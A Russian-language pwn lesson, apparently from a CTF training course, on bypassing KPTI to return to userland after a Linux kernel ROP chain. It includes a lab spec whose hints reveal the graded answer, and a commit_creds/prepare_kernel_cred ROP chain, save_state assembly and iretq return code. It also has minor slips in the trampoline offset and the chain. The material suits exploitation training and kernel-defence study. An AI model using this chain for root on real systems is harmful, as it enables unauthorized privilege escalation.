---
id: pwn-kpti-bypass
title: "KPTI bypass: trampoline и возврат в userland"
category: pwn
parent: pwn-kernel-bypass
difficulty: expert
order: 2
tags: [pwn, kernel, kpti, meltdown, trampoline, swapgs, return-to-user]
prerequisites: [pwn-kernel-bypass, pwn-kernel-rop]
useful_for:
  - "Возврат в userland после kernel ROP на современных ядрах"
  - "Понимание изоляции адресных пространств ядра"
estimated_minutes: 60
summary: "KPTI (Page-Table Isolation): почему прямой ret в userland перестал работать, что такое trampoline swapgs_restore_regs_and_return_to_usermode и как правильно завершить kernel ROP-цепочку."
lab:
  kind: shell
  title: "Практика: чем завершают kernel ROP"
  toolset: [core, elf]
  workdir: /home/student/task
  files: [task.md, vmlinux.gadgets.txt]
  check: "grep -q 'finish=trampoline' answer.txt"
  hints:
    - "Прямой возврат в userland на KPTI-ядре ломается."
    - "Нужна функция, которая переключает таблицы страниц."
    - "Она называется trampoline."
    - "Запиши `finish=trampoline`."
---

## Вопрос, с которого всё начинается

Ты собрал kernel ROP: `commit_creds(prepare_kernel_cred(0))` выполнился, root
получен. Осталось вернуться в userland и запустить shell. Но на современном
ядре прямой `ret` в userland падает. Почему? Потому что включён **KPTI**.

## Наш пример

Проверяем, включён ли KPTI:

```
$ cat /sys/devices/system/cpu/vulnerabilities/meltdown
Mitigation: PTI
$ grep -i pti /proc/cpuinfo
flags: ... pti ...
```

`Mitigation: PTI` означает, что KPTI (Page-Table Isolation) активен. Дальше
смотрим, как ядро возвращается в userland.

## Шаг 1: что делает KPTI

До KPTI у ядра и userland была **одна** таблица страниц: в userland-режиме
страницы ядра просто помечались недоступными (бит U/S), но всё равно
присутствовали в TLB. Атака Meltdown показала, что спекулятивное исполнение
может прочитать ядро через эту «присутствующую» память.

KPTI разделяет адресные пространства: у userland своя таблица страниц, где
ядерных страниц почти нет. При входе в ядро процессор переключается на
ядровую таблицу. Значит, «просто вернуться» в userland нельзя — нужен код,
который **переключит таблицу страниц обратно** и восстановит регистры.

## Шаг 2: trampoline

В ядре есть специальный код — **trampoline** — функция
`swapgs_restore_regs_and_return_to_usermode`. Она:

1. Делает `swapgs` (меняет местами GS-регистры user/kernel).
2. Переключает таблицу страниц на userland.
3. Восстанавливает регистры из стека ядра.
4. Выполняет `iretq` — возврат в userland.

Символ находим так:

```
$ grep -E 'swapgs_restore_regs_and_return_to_usermode' /proc/kallsyms
ffffffff81e00e10 T swapgs_restore_regs_and_return_to_usermode
```

Нам нужен не самый её вход, а точка **после** восстановления части регистров —
обычно `+22` байта (зависит от ядра). Точный offset смотрим в дизассемблере:

```
$ objdump -d vmlinux --start-address=0xffffffff81e00e10 | head -20
ffffffff81e00e10: pop r15
ffffffff81e00e11: pop r14
...
ffffffff81e00e1e: mov rdi, rsp        ; тут начинается интересное
```

## Шаг 3: как выглядит конец ROP-цепочки

После `commit_creds` цепочка должна выставить на стеке значения для trampoline:

```
[ trampoline + offset ]   ; адрес точки входа в trampoline
[ fake rax ]              ; мусор
[ fake rdi ]
[ user_rip ]              ; куда вернуться в userland (win-функция)
[ user_cs ]               ; сегмент кода userland
[ user_rflags ]
[ user_sp ]               ; стек userland
[ user_ss ]
```

`user_rip` — адрес нашей функции, которая откроет shell. `user_cs/rflags/ss`
сохраняют заранее из userland:

```c
void save_state(void) {
    __asm__ volatile(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "pushfq\n pop %2\n"
        "mov %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp));
}
```

## Шаг 4: почему нельзя просто `ret`

Если после `commit_creds` поставить `ret` на адрес userland-функции, произойдёт
вот что: ядро всё ещё использует ядровую таблицу страниц, а `iretq`/`ret` не
переключит её. Процессор выполнит инструкцию по userland-адресу, но в контексте
ядровых страниц — и либо упадёт (страница не отображена), либо даст неправильный
режим. Именно поэтому нужен trampoline, который делает всё в правильном порядке.

## Шаг 5: если KPTI выключен

На старых ядрах (`nopti` в параметрах загрузки) можно вернуться напрямую:

```c
__asm__ volatile(
    "swapgs;"
    "mov %0, %%rsp;"
    "push %1; push %2; push %3; push %4; push %5;"
    "iretq;"
    :: "r"(user_sp), "r"(user_ss), "r"(user_sp), "r"(user_rflags),
       "r"(user_cs), "r"(user_rip));
```

Но на современном ядре это не сработает — нужен trampoline. Поэтому эксплойт
обычно содержит обе ветки и выбирает по наличию `pti` в `/proc/cpuinfo`.

## Шаг 6: типичные ошибки

| Симптом | Причина | Решение |
|---|---|---|
| падение сразу после commit_creds | нет возврата через trampoline | добавить trampoline |
| `general protection fault` на iretq | неверный CS/SS | сохранить сегменты из userland |
| shell не появляется, но root есть | вернулись не туда | проверить user_rip |
| ядро паникует | неправильный offset trampoline | сверить дизассемблер |

## Шаг 7: альтернативы возврату

Иногда возвращаться в userland не нужно: если цель — просто повысить привилегии
текущего процесса, можно завершить цепочку функцией, которая восстанавливает
контекст корректно, или использовать data-only (перезапись `cred`) — тогда
никакого `iretq` не требуется. Выбор зависит от задачи.

## Что мы теперь знаем

- KPTI разделяет таблицы страниц ядра и userland (защита от Meltdown).
- Прямой `ret` в userland на KPTI-ядре не работает.
- `swapgs_restore_regs_and_return_to_usermode` — trampoline для возврата.
- Нужно сохранить CS/SS/RFLAGS/SP из userland заранее.
- Data-only иногда избавляет от возврата вовсе.

## Дизассемблируем trampoline

Чтобы найти правильный offset внутри `swapgs_restore_regs_and_return_to_usermode`,
дизассемблируем её:

```
$ objdump -d vmlinux --start-address=0xffffffff81e00e10 | head -30
ffffffff81e00e10 <swapgs_restore_regs_and_return_to_usermode>:
ffffffff81e00e10:  pop    r15
ffffffff81e00e11:  pop    r14
ffffffff81e00e12:  pop    r13
ffffffff81e00e13:  pop    r12
ffffffff81e00e14:  pop    rbp
ffffffff81e00e15:  pop    rbx
ffffffff81e00e16:  pop    r11
ffffffff81e00e17:  pop    r10
ffffffff81e00e18:  pop    r9
ffffffff81e00e19:  pop    r8
ffffffff81e00e1a:  pop    rax
ffffffff81e00e1b:  pop    rcx
ffffffff81e00e1c:  pop    rdx
ffffffff81e00e1d:  pop    rsi
ffffffff81e00e1e:  mov    rdi, rsp
ffffffff81e00e21:  mov    rsp, qword ptr gs:[0x6004]
...
```

Нам нужна точка **`mov rdi, rsp`** (в примере `+14` от начала, но число зависит
от ядра и набора пропускаемых `pop`). После неё ядро ожидает на стеке значения
для `iretq`: `RIP, CS, RFLAGS, RSP, SS`. Именно их мы и кладём в конец
ROP-цепочки.

## Полная цепочка ROP с возвратом

Собираем всё вместе:

```c
// 1) commit_creds(prepare_kernel_cred(0))
chain  = p64(pop_rdi_ret);
chain += p64(0);                       // аргумент: NULL
chain += p64(prepare_kernel_cred);
chain += p64(pop_rdi_ret);
chain += p64(0x0);                     // вернём указатель в rdi? -> нужен mov rdi, rax
chain += p64(mov_rdi_rax_ret);         // переносим cred в rdi
chain += p64(commit_creds);
// 2) возврат в userland через trampoline
chain += p64(trampoline + offset);
chain += p64(0); chain += p64(0);      // rax, rdi (мусор)
chain += p64(user_rip);                // win()
chain += p64(user_cs);
chain += p64(user_rflags);
chain += p64(user_sp);
chain += p64(user_ss);
```

Порядок «мусорных» значений (rax, rdi) зависит от точки входа trampoline: сколько
регистров она ещё восстанавливает из стека, столько слов надо положить. Проверяй
по дизассемблеру.

## Сохранение userland-состояния

Функция `save_state` вызывается **до** триггера уязвимости, пока мы ещё в
userland:

```c
uint64_t user_cs, user_ss, user_rflags, user_sp;
void save_state(void) {
    __asm__ volatile(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "pushfq\n"
        "pop %2\n"
        "mov %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
        :
        : "memory");
}
```

`user_rip` — адрес функции `win()`, которая после возврата откроет shell.
`user_sp` можно взять из сохранённого значения; главное, чтобы он указывал на
валидную userland-страницу.

## Когда KPTI нет

Проверяем:

```
$ grep -i pti /proc/cpuinfo
$ cat /sys/devices/system/cpu/vulnerabilities/meltdown
```

Если `Mitigation: PTI` отсутствует (старое ядро или `nopti`), прямой возврат
работает:

```c
__asm__ volatile(
    "swapgs; mov %0, %%rsp; push %1; push %2; push %3; push %4; push %5; iretq;"
    :: "r"(user_sp), "r"(user_ss), "r"(user_sp),
       "r"(user_rflags), "r"(user_cs), "r"(user_rip));
```

Эксплойт обычно содержит обе ветки и выбирает по наличию PTI — это делает его
переносимым между ядрами.

## Проверка на реальном ядре

Собрав цепочку, проверь её в контролируемых условиях: запусти уязвимое ядро под
`qemu`, поставь точку на trampoline и посмотри значения на стеке:

```
(gdb) b *trampoline+14
(gdb) c
(gdb) x/6gx $rsp
```

Ты должен увидеть `RIP, CS, RFLAGS, RSP, SS` в правильном порядке. Если порядок
не тот — сдвинь «мусорные» значения. Если `RIP` указывает не на `win()`, цепочка
собрана неверно.

## Итог по KPTI

KPTI изолирует адресные пространства ядра и userland, поэтому прямой `ret` в
userland не работает. Завершай kernel ROP через
`swapgs_restore_regs_and_return_to_usermode`, сохранив `CS/SS/RFLAGS/SP`
заранее. На ядрах без PTI можно вернуться напрямую — эксплойт содержит обе ветки.

## Разбор реального KPTI-сценария

Цель — Linux-ядро 5.x с KPTI. Мы получили kernel ROP: `commit_creds` выполнен,
процесс — root. Но при попытке `ret` в userland ядро падает. Добавляем
trampoline:

1. Находим адрес `swapgs_restore_regs_and_return_to_usermode` в `vmlinux`.
2. Смотрим дизассемблер и берём offset точки `mov rdi, rsp`.
3. Дописываем в конец цепочки trampoline и пять слов (`RIP, CS, RFLAGS, RSP, SS`).
4. Проверяем под `qemu`: shell появляется от root.

Это стандартный финал почти любого kernel-ROP-эксплойта на современном ядре.

## Типичные ошибки при возврате

- **Неверный offset trampoline.** Возьми точку `mov rdi, rsp` из дизассемблера.
- **Мало/много «мусорных» слов.** Их число = сколько регистров ещё восстанавливает
  trampoline.
- **Не сохранили сегменты.** CS/SS берутся из userland заранее.
- **Забыли про PTI.** Без trampoline прямой `ret` падает.

## Заключение по KPTI

KPTI — обязательная часть современного kernel-эксплойта. Запомни последовательность:
`commit_creds` → trampoline → `iretq` с сохранёнными `RIP/CS/RFLAGS/RSP/SS`. Точку
входа в trampoline бери из дизассемблера, а не из памяти. Если ядро собрано без
PTI, прямой возврат тоже сработает — держи обе ветки. С этим финишером твоя
kernel-ROP-цепочка доводится до shell.

## Квиз

Проверь себя.

```quiz
- question: Зачем нужен KPTI?
  options:
    - "Изолировать страницы ядра от userland (защита от Meltdown)"
    - "Ускорить syscall"
    - "Сжать память"
    - "Шифровать диск"
  answer: 0
  explanation: KPTI убирает ядерные страницы из userland-таблицы.
- question: Что делает trampoline?
  options:
    - "Переключает таблицу страниц и возвращает в userland через iretq"
    - "Пишет в диск"
    - "Спреит кучу"
    - "Читает MSR"
  answer: 0
  explanation: swapgs_restore_regs_and_return_to_usermode завершает kernel ROP.
- question: Что нужно сохранить из userland для iretq?
  options:
    - "CS, SS, RFLAGS, SP"
    - "Только RAX"
    - "Ничего"
    - "Только SP"
  answer: 0
  explanation: iretq восстанавливает сегменты и флаги из стека.
- question: Почему прямой ret в userland падает на KPTI?
  options:
    - "Таблица страниц не переключена"
    - "Нет памяти"
    - "Нет сети"
    - "Нет root"
  answer: 0
  explanation: Без переключения страниц userland-адрес недоступен.
- question: Когда можно вернуться напрямую?
  options:
    - "Когда KPTI выключен (nopti)"
    - "Всегда"
    - "Когда нет ASLR"
    - "Когда мало RAM"
  answer: 0
  explanation: Без KPTI таблица страниц общая, прямой возврат возможен.
```

## Куда дальше

Дальше — **code-reuse техники** (JOP/COP/DOP/COOP) для целей с защищённым
потоком управления. А пока запомни: **на KPTI-ядре kernel ROP завершается не
`ret`, а trampoline-функцией, переключающей таблицу страниц**.

## Где пригодится

- Написание и адаптация kernel-эксплойтов.
- Понимание защит ядра (KPTI, Meltdown).
- kernelCTF и CTF-задачи на ядро.
